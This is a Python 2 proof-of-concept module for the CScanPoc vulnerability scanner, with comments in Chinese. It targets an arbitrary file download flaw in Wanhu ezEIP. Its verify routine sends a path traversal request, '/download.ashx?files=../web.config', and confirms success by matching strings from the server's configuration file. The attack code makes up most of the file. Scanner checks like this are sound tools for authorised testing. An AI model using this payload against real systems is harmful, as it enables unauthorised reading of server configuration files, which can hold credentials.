# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'WHIR_0002' # 平台漏洞编号，留空
    name = '万户ezeip 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        万户ezeip /download.ashx?files=../web.config 文件下载漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '万户'  # 漏洞应用名称
    product_version = '万户ezeip'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6b8ac75d-14e5-412c-98b8-dde8d74b32ab'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/download.ashx?files=../web.config'
            verify_url = self.target + payload
            req = requests.get(verify_url)
            
            if req.status_code == 200 and 'cachingConfiguration' in req.content and 'rootRollingFile' in req.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
